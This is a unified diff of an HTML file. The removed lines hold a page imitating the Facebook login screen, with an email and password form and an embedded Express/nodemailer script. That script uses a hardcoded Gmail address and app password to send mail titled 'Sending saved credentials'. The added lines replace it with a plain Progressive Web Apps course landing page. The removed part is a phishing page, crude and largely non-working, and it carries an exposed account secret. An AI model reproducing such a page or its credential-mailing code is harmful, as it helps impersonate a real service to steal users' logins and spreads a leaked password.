@@ -1,241 +1,45 @@
-<!DOCTYPE html>
-<html>
+<!doctype html>
+<html lang="en">
 <head>
-   <title>Facebook – log in or sign up</title>
-   <meta name="viewport" content="width=device-width, initial-scale=0.5">
-   <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico">
+  <meta charset="UTF-8">
+  <meta name="viewport"
+        content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>Progressive Web Apps</title>
+  <link rel="stylesheet" href="/src/css/app.css">
+  <link rel="manifest" href="/manifest.json">
 </head>
-
-<style>
-/* Default styles for desktop */
-body {
- margin: 0;
- padding: 0;
- box-sizing: border-box;
- font-family: 'Roboto', sans-serif;
- justify-content: center;
- align-items: center;
- height: auto;
-}
-.container {
- padding: 0 15px;
- height: auto;
- justify-content: center;
- align-items: center;
- display: flex;
- flex-direction: column;
- background: #f0f2f5;
- padding: 15%;
-}
-.facebook-page {
- justify-content: space-between;
- width: 100%;
- display: flex;
- align-items: center;
-}
-.facebook-page .text {
- margin-bottom: 90px;
- margin-right: 90px;
-}
-.facebook-page h1 {
- color: #1877f2;
- font-size: 4rem;
- margin-bottom: 10px;
-}
-.facebook-page p {
- font-size: 1.75rem;
- white-space: normal;
- word-wrap: break-word;
- overflow-wrap: break-word;
-}
-
-form {
- display: flex;
- flex-direction: column;
- background: #fff;
- border-radius: 8px;
- padding: 20px;
- box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1),
- 0 8px 16px rgba(0, 0, 0, 0.1);
- max-width: 400px;
- width: 100%;
- align-items: center;
-}
-form input {
- height: 55px;
- width: 95%;
- border: 1px solid #ccc;
- border-radius: 6px;
- margin-bottom: 15px;
- font-size: 1rem;
- padding: 0 14px;
-}
-form input:focus {
- outline: none;
- border-color: #1877f2;
-}
-::placeholder {
- color: #777;
- font-size: 1.063rem;
-}
-.link {
- display: flex;
- flex-direction: column;
- text-align: center;
- gap: 15px;
-}
-.link .login {
- border: none;
- outline: none;
- cursor: pointer;
- background: #1877f2;
- padding: 15px 0;
- border-radius: 6px;
- color: #fff;
- font-size: 1.25rem;
- font-weight: 600;
- transition: 0.2s ease;
-}
-.link .login:hover {
- background: #0d65d9;
-}
-form a {
- text-decoration: none;
-}
-.link .forgot {
- color: #1877f2;
- font-size: 0.875rem;
-}
-.link .forgot:hover {
- text-decoration: underline;
-}
-hr {
- border: none;
- height: 1px;
- background-color: #ccc;
- margin-bottom: 20px;
- margin-top: 20px;
-}
-.button {
- margin-top: 25px;
- text-align: center;
- margin-bottom: 20px;
-}
-.button a {
- padding: 15px 20px;
- background: #42b72a;
- border-radius: 6px;
- color: #fff;
- font-size: 1.063rem;
- font-weight: 600;
- transition: 0.2s ease;
-}
-.button a:hover {
- background: #3ba626;
-}
-@media (max-width: 900px) {
- body {
- 	max-width: 900px;
- }	
- .container {
-max-width: 900px;
- }
-
- .facebook-page {
- flex-direction: column;
- }
- .facebook-page .text {
- margin-bottom: 30px;
- margin-right: 0px;
- }
-  .facebook-page h1 {
-text-align: center;
- }
- .facebook-page p {
-text-align: center;
- }
-}
-@media (max-width: 460px) {
- body {
- 	max-width: 460px;
- }	
- .container {
- 	max-width: 460px;
- }
- .facebook-page h1 {
- font-size: 3.5rem;
- }
- .facebook-page p {
- font-size: 1.3rem;
- }
- form {
- padding: 15px;
- }
-}
-
-</style>
-
 <body>
-<script>
-var express = require('express');
-var nodemailer = require('nodemailer');
-var path = require('path');
-var app = express();
-
-app.use(express.static('public'));
-
-app.get('/', function(req, res) {
- res.sendFile(path.join(__dirname, 'index.html'));
-});
-
-app.post('/send-email', function(req, res) {
- var transporter = nodemailer.createTransport({
-  service: 'gmail',
-  auth: {
-    user: 'u76922613@gmail.com',
-    pass: 'yamx sopu zbzj rnug'
-  }
- });
-
- var mailOptions = {
-  from: 'u76922613@gmail.com',
-  to: 'u76922613@gmail.com',
-  subject: 'Sending saved credentials',
-  text: 'This is a test email'
- };
-
- transporter.sendMail(mailOptions, function(error, info) {
-  if (error) {
-    console.log(error);
-    res.status(500).send('Error sending email');
-  } else {
-    console.log('Email sent: ' + info.response);
-    res.status(200).send('Email sent successfully');
-  }
- });
-});
-
-app.listen(3000, function() {
- console.log('Server is listening on port 3000');
-});
-</script>
-
-   <div class="container">
-       <div class="facebook-page">
-           <div class="text">
-               <h1>facebook</h1>
-               <p>Facebook helps you connect and share with the people in your life.</p>
-           </div>
-           <form>
-               <input type="text" placeholder="Email or phone number">
-               <input type="password" placeholder="Password">
-               <div class="link">
-                  <a href="#" class="login">Login</a>
-                  <a href="#" class="forgot">Forgot password?</a>
-                  <a href="#" class="create">Create new account</a>
-               </div>
-           </form>
-       </div>
-   </div>
+<div class="title">
+  <h1>Progressive Web Apps</h1>
+</div>
+<div class="content">
+  <div class="course-feature" id="installable">
+    <p>They're installable (without an App Store)!</p>
+  </div>
+  <div class="course-feature" id="offline">
+    <p>They can work offline!</p>
+  </div>
+  <div class="course-feature" id="responsive">
+    <p>They look good on any device</p>
+  </div>
+  <div class="course-feature" id="push">
+    <p>You can receive Push Messages...</p>
+  </div>
+  <div class="course-feature" id="notifications">
+    <p>...and show Notifications</p>
+  </div>
+  <div class="course-feature" id="native-features">
+    <p>PWAs can access native device features like the Camera</p>
+  </div>
+  <div class="course-feature" id="more">
+    <p>And so much more!</p>
+  </div>
+</div>
+<div class="start-over">
+  <button>Start Again!</button>
+  <a href="/what.html">Click Me</a>
+</div>
+<script src="/src/js/app.js"></script>
 </body>
 </html>
